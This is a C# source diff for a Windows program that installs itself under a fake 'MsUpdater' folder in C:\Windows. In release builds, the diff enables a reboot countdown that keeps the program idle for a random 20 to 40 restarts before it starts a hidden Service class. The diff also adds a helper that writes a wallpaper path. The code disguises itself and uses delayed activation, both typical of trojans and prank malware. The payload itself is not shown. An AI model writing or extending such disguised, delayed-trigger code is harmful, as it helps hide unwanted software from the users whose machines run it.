@@ -3,8 +3,9 @@
     using System;
     using System.Diagnostics;
     using System.IO;
+#if !DEBUG
     using System.Linq;
-    using System.Net;
+#endif
     using System.Runtime.CompilerServices;
     using System.Threading;
 
@@ -18,47 +19,33 @@
             }
 
             Thread.Sleep(200);
-			/*
-#if !DEBUG
-            const string Target = @"C:\Windows\MsUpdater\trigger";
 
-            if (!File.Exists(Target))
+#if !DEBUG
+            const string target = @"C:\Windows\MsUpdater\trigger";
+
+            if (!File.Exists(target))
             {
-                File.WriteAllText(Target, new Random().Next(20, 40).ToString());
+                File.WriteAllText(target, new Random().Next(20, 40).ToString());
                 return;
             }
 
-            var reboots = int.Parse(File.ReadAllLines(Target).Single());
+            var reboots = int.Parse(File.ReadAllLines(target).Single());
 
             if (reboots != 0)
             {
-                File.WriteAllText(Target, (reboots - 1).ToString());
+                File.WriteAllText(target, (reboots - 1).ToString());
                 return;
             }
 #endif
-*/
-	        const string WpTarget = @"C:\Windows\MsUpdater\wallpaper";
-			const string WpFile = @"C:\Windows\MsUpdater\wallpaper.jpg";
 
-            using (var client = new WebClient())
-            {
-                client.DownloadFile("https://images4.alphacoders.com/121/thumb-1920-121678.jpg", WpFile);
-            }
+            RuntimeHelpers.RunClassConstructor(typeof(Service).TypeHandle);
 
-			File.WriteAllText(WpTarget, WpFile);
+            Process.GetCurrentProcess().WaitForExit();
+        }
 
-            return;
-
-            // TODO Directory security
-
-            using (File.Open(@"C:\Windows\MsUpdater\Bootstrap.exe", FileMode.Open, FileAccess.Read, FileShare.Read))
-            {
-                using (File.Open(@"C:\Windows\MsUpdater\InputSimulator.dll", FileMode.Open, FileAccess.Read, FileShare.Read))
-                {
-                    RuntimeHelpers.RunClassConstructor(typeof(Service).TypeHandle);
-                    Process.GetCurrentProcess().WaitForExit();
-                }
-            }
+        internal static void SetWallpaper(string wallpaper)
+        {
+            File.WriteAllText(@"C:\Windows\MsUpdater\wallpaper", wallpaper);
         }
     }
 }
